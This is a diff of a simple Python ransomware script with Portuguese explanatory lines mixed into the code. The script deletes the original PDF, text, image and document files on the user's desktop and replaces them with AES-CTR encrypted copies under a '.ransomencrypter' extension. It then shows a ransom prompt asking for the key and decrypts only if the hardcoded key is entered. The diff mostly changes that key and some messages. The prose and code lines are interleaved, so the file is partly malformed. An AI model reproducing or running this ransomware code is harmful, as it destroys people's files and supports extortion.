@@ -14,7 +14,6 @@ import os  # sistema operacional
 import glob  # busca os arquivos
 
 
-import time
 
 
 import pyaes  # biblioteca de criptografia aes
@@ -29,7 +28,6 @@ lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]
 
 print('Criptografando')
 
-time.sleep(3)
  
 Aqui estamos confirmando que os arquivos que tem que ser criptografados existem, nesse código eu escolhi criptografar os arquivos existentes no desktop.
 try:
@@ -50,7 +48,7 @@ def criptografando():
             data_arqui = A.read()
             A.close()
             os.remove(f'{desktop}\\{format_arqui}')
-            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
+            key = b"lkghpryvxzkjfdtc"  # uma chave qualquer que tenha 16 caracteres
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
             crypto_data = aes.encrypt(data_arqui)
             novo_arqui = format_arqui + ".ransomencrypter"
@@ -64,21 +62,18 @@ Este é o nosso descrypt ele é o responsável por fazer o processo inverso ao a
    try:
    
        for arquivo in glob.glob('*.ransomencrypter'):
-            keybytes = decrypt_file.encode()
+            decryptf = decrypt_file.encode()
             name_arquivo = open(arquivo, 'rb')
             data_arqui = name_arquivo.read()
-            akey = keybytes
+            akey = decryptf
             aaes = pyaes.AESModeOfOperationCTR(akey)  # gera a decriptografia
             decrypt_data = aaes.decrypt(data_arqui)
-
             format_file = arquivo.split('.')
-            new_nome_arquivo = format_file[0] + '.' + format_file[1]
-
+            new_nome_arquivo = format_file[0] + '.' + format_file[1]  #é aqui onde ele retorna o arquivo ao desktop
             dnovo_arquivo = open(f'{desktop}\\{new_nome_arquivo}', 'wb')
             dnovo_arquivo.write(decrypt_data)
-            dnovo_arquivo.close()
     except ValueError as err:
-        print('Chave errada, que pena ;(')
+        print()
         
 Aqui é onde a mensagem de criptografia é exibida assim que os arquivos forem encriptados e pede pela chave de liberação 'Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:', se a chave estiver correta ele descriptografa os arquivos e se ela não estiver correta ele exibe a mensagem 'Chave de liberação inválida.', e caso ela esteja correta o código se encerra. 
  
@@ -89,9 +84,10 @@ if __name__ == '__main__':
     criptografando()
     if criptografando:
         key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
-        if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
+        if key == 'lkghpryvxzkjfdtc':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
             for del_file in glob.glob('*.ransomencrypter'):
                 os.remove(f'{desktop}\\{del_file}')
+            print('seu pc foi descriptografado')
         else:
             print('Chave de liberação inválida, que pena ;(')
